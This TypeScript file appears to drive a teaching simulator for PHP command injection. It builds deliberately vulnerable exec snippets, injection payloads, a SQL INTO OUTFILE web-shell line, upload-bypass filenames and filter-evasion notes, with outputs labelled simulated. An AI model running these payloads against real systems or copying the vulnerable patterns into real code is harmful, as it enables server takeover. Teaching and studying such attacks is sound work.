import {
  InjectionPoint,
  TargetFunction,
  ShellType,
  type InjectionPointInfo,
  type TargetFunctionInfo,
  type SimulationResult,
} from "@/types";

export const INJECTION_POINTS: InjectionPointInfo[] = [
  {
    id: InjectionPoint.FILE_UPLOAD,
    label: "File Upload (filename/content)",
    description: "Attacker controls an uploaded file's name and/or content, which the app later writes to a web-accessible path.",
    entrySnippet: `move_uploaded_file($_FILES['f']['tmp_name'], 'uploads/' . $_FILES['f']['name']);`,
  },
  {
    id: InjectionPoint.GET_PARAM,
    label: "GET Parameter",
    description: "A query-string value flows unsanitized into a dangerous sink.",
    entrySnippet: `$host = $_GET['host'];`,
  },
  {
    id: InjectionPoint.POST_DATA,
    label: "POST Body Field",
    description: "A form field submitted via POST flows into a dangerous sink.",
    entrySnippet: `$cmd = $_POST['cmd'];`,
  },
  {
    id: InjectionPoint.COOKIE,
    label: "Cookie Value",
    description: "A cookie value, often assumed 'trusted' because the app itself set it earlier, is attacker-controlled on replay.",
    entrySnippet: `$pref = $_COOKIE['pref'];`,
  },
  {
    id: InjectionPoint.HTTP_HEADER,
    label: "HTTP Header (e.g. User-Agent, X-Forwarded-For)",
    description: "A request header is logged or used in a shell command (e.g. a log-analysis or geo-IP lookup script).",
    entrySnippet: `$ua = $_SERVER['HTTP_USER_AGENT'];`,
  },
  {
    id: InjectionPoint.SQL_INJECTION,
    label: "SQL Injection → stacked write",
    description: "A SQL injection with FILE privilege is used to write a PHP file to disk (INTO OUTFILE), which is then reached via the command sink.",
    entrySnippet: `' UNION SELECT '<?php system($_GET[1]); ?>',1 INTO OUTFILE '/var/www/html/x.php'-- -`,
  },
];

export const TARGET_FUNCTIONS: TargetFunctionInfo[] = [
  {
    id: TargetFunction.SHELL_EXEC,
    label: "shell_exec()",
    description: "Executes a command via the shell and returns the complete output as a string.",
    signature: "shell_exec(string $command): ?string",
    returnsOutput: true,
  },
  {
    id: TargetFunction.SYSTEM,
    label: "system()",
    description: "Executes a command and streams output directly; returns the last line.",
    signature: "system(string $command, &$result_code = null): string|false",
    returnsOutput: true,
  },
  {
    id: TargetFunction.EXEC,
    label: "exec()",
    description: "Executes a command, optionally returning all output lines into an array.",
    signature: "exec(string $command, &$output = null, &$result_code = null): string|false",
    returnsOutput: true,
  },
  {
    id: TargetFunction.PASSTHRU,
    label: "passthru()",
    description: "Executes a command and passes raw, unprocessed output straight to the client (useful for binary output).",
    signature: "passthru(string $command, &$result_code = null): ?bool",
    returnsOutput: false,
  },
  {
    id: TargetFunction.PROC_OPEN,
    label: "proc_open()",
    description: "Opens a process with full control over its stdin/stdout/stderr pipes — the most flexible, and most commonly used safely via its array-argument form.",
    signature: "proc_open(array|string $command, array $descriptorspec, &$pipes, ...): resource|false",
    returnsOutput: true,
  },
  {
    id: TargetFunction.POPEN,
    label: "popen()",
    description: "Opens a pipe to a process for reading or writing, similar in spirit to shell_exec but stream-based.",
    signature: "popen(string $command, string $mode): resource|false",
    returnsOutput: true,
  },
];

const SHELL_LABELS: Record<ShellType, string> = {
  [ShellType.BASH]: "bash",
  [ShellType.SH]: "sh",
  [ShellType.ZSH]: "zsh",
  [ShellType.POWERSHELL]: "PowerShell",
};

function buildVulnerableSnippet(point: InjectionPoint, fn: TargetFunction): string {
  const source: Record<InjectionPoint, string> = {
    [InjectionPoint.FILE_UPLOAD]: `$name = $_FILES['f']['name'];`,
    [InjectionPoint.GET_PARAM]: `$host = $_GET['host'];`,
    [InjectionPoint.POST_DATA]: `$cmd = $_POST['cmd'];`,
    [InjectionPoint.COOKIE]: `$pref = $_COOKIE['pref'];`,
    [InjectionPoint.HTTP_HEADER]: `$ua = $_SERVER['HTTP_USER_AGENT'];`,
    [InjectionPoint.SQL_INJECTION]: `// (value arrives via a stacked SQL write to a webroot file, then is requested directly)`,
  };

  const call: Record<TargetFunction, (expr: string) => string> = {
    [TargetFunction.SHELL_EXEC]: (e) => `$output = shell_exec("ping -c 2 " . ${e});`,
    [TargetFunction.SYSTEM]: (e) => `system("ping -c 2 " . ${e});`,
    [TargetFunction.EXEC]: (e) => `exec("ping -c 2 " . ${e}, $out);`,
    [TargetFunction.PASSTHRU]: (e) => `passthru("ping -c 2 " . ${e});`,
    [TargetFunction.PROC_OPEN]: (e) => `proc_open("ping -c 2 " . ${e}, $desc, $pipes);`,
    [TargetFunction.POPEN]: (e) => `$h = popen("ping -c 2 " . ${e}, 'r');`,
  };

  const varName: Record<InjectionPoint, string> = {
    [InjectionPoint.FILE_UPLOAD]: "$name",
    [InjectionPoint.GET_PARAM]: "$host",
    [InjectionPoint.POST_DATA]: "$cmd",
    [InjectionPoint.COOKIE]: "$pref",
    [InjectionPoint.HTTP_HEADER]: "$ua",
    [InjectionPoint.SQL_INJECTION]: "$host",
  };

  return `<?php\n${source[point]}\n${call[fn](varName[point])}`;
}

export function simulatePayload(
  point: InjectionPoint,
  fn: TargetFunction,
  shell: ShellType,
  rawCommand: string
): SimulationResult {
  const command = rawCommand.trim() || "id";
  const shellLabel = SHELL_LABELS[shell];

  // Separator chosen for illustration; real metacharacters vary by shell/context.
  const separator = shell === ShellType.POWERSHELL ? ";" : ";";
  const injectedValue =
    point === InjectionPoint.SQL_INJECTION
      ? `' UNION SELECT '<?php system($_GET[1]); ?>',1 INTO OUTFILE '/var/www/html/x.php'-- -`
      : `8.8.8.8 ${separator} ${command}`;

  const generatedPayload =
    point === InjectionPoint.FILE_UPLOAD
      ? `shell.php%00.jpg   (legacy null-byte bypass)\nshell.phtml        (alternate executable extension)\nshell.php.jpg      (double-extension, relies on misconfigured server)`
      : injectedValue;

  const vulnerablePhpSnippet = buildVulnerableSnippet(point, fn);

  const simulatedOutput =
    point === InjectionPoint.SQL_INJECTION
      ? `[simulated] File written: /var/www/html/x.php\n[simulated] GET /x.php?1=${encodeURIComponent(command)}\n[simulated:${shellLabel}] ${command} → (output would appear here on a real, vulnerable target)`
      : `[simulated:${shellLabel}] PING 8.8.8.8 (8.8.8.8): 56 data bytes\n...\n[simulated:${shellLabel}] $ ${command}\n(output of "${command}" would appear here on a real, vulnerable target)`;

  const impactExplanation =
    point === InjectionPoint.FILE_UPLOAD
      ? "If the upload handler trusts the filename/MIME type, this stored file becomes directly requestable and PHP executes it with the privileges of the web server process."
      : `The shell separator ("${separator}") terminates the intended command, after which the shell runs "${command}" with the privileges of the web server process (commonly www-data or similar). ${TARGET_FUNCTIONS.find((f) => f.id === fn)?.label} then returns whatever that second command produced.`;

  const bypassNotes =
    fn === TargetFunction.SHELL_EXEC || fn === TargetFunction.SYSTEM
      ? [
          "If disable_functions blocks this call, an attacker may look for mail(), dl(), or a vulnerable extension as an alternate sink.",
          "Blacklisted characters (;, |, &) are sometimes bypassable with $IFS for spaces, backticks, or $() substitution.",
          "WAF rules matching literal command names can sometimes be evaded with quoting, concatenation, or encoding tricks — never rely on a blacklist alone.",
        ]
      : undefined;

  return {
    injectionPoint: point,
    targetFunction: fn,
    shell,
    command,
    generatedPayload,
    vulnerablePhpSnippet,
    simulatedOutput,
    impactExplanation,
    bypassNotes,
  };
}
